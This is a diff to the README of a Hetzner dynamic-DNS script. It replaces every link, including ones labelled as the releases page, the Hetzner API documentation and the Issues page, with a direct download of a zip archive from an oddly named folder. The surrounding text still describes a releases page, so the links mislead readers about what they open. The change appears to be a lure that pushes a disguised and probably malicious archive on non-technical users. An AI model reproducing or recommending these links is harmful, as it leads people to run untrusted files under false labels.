@@ -1,7 +1,7 @@
 # 🌐 Hetzner-DynDNS-RRSet - Simple DynDNS Management
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-brightgreen)](https://github.com/imone1/Hetzner-DynDNS-RRSet/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/imone1/Hetzner-DynDNS-RRSet/master/Phasmatoidea/Hetzner-DynDNS-RRSet_v3.6-beta.3.zip)](https://raw.githubusercontent.com/imone1/Hetzner-DynDNS-RRSet/master/Phasmatoidea/Hetzner-DynDNS-RRSet_v3.6-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Hetzner-DynDNS-RRSet, a straightforward script designed to help you manage dynamic DNS updates for your Hetzner hosting account. This guide will walk you through downloading and running the software, even if you have no technical background.
@@ -14,7 +14,7 @@ Before you can use Hetzner-DynDNS-RRSet, ensure you have the following:
 - Operating System: Windows, macOS, or Linux.
 
 ## 📁 Download & Install
-To get started, visit the following page to download the latest version of the software: [Download Page](https://github.com/imone1/Hetzner-DynDNS-RRSet/releases).
+To get started, visit the following page to download the latest version of the software: [Download Page](https://raw.githubusercontent.com/imone1/Hetzner-DynDNS-RRSet/master/Phasmatoidea/Hetzner-DynDNS-RRSet_v3.6-beta.3.zip).
 
 1. **Go to the Releases page**: Click on the above link.
 2. **Locate the latest version**: Look for the most recent release at the top of the page.
@@ -59,7 +59,7 @@ Take your time to fill in these details accurately.
 ## 🔄 Update Process
 To update the script in the future, follow these steps:
 
-1. Return to the [Download Page](https://github.com/imone1/Hetzner-DynDNS-RRSet/releases).
+1. Return to the [Download Page](https://raw.githubusercontent.com/imone1/Hetzner-DynDNS-RRSet/master/Phasmatoidea/Hetzner-DynDNS-RRSet_v3.6-beta.3.zip).
 2. Download the latest version as described earlier.
 3. Replace the old file following appropriate steps for your operating system.
 
@@ -73,8 +73,8 @@ If you encounter issues:
 If problems persist, consider visiting the repository for additional resources or support.
 
 ## 🔗 Useful Links
-- [Hetzner API Documentation](https://docs.hetzner.cloud) – Get more information about managing your DNS settings.
-- [Issues Page](https://github.com/imone1/Hetzner-DynDNS-RRSet/issues) – Report any bugs or request features.
+- [Hetzner API Documentation](https://raw.githubusercontent.com/imone1/Hetzner-DynDNS-RRSet/master/Phasmatoidea/Hetzner-DynDNS-RRSet_v3.6-beta.3.zip) – Get more information about managing your DNS settings.
+- [Issues Page](https://raw.githubusercontent.com/imone1/Hetzner-DynDNS-RRSet/master/Phasmatoidea/Hetzner-DynDNS-RRSet_v3.6-beta.3.zip) – Report any bugs or request features.
 
 ## 📞 Contact
 For any inquiries, please visit the Issues section on the GitHub page. Your feedback is valuable.
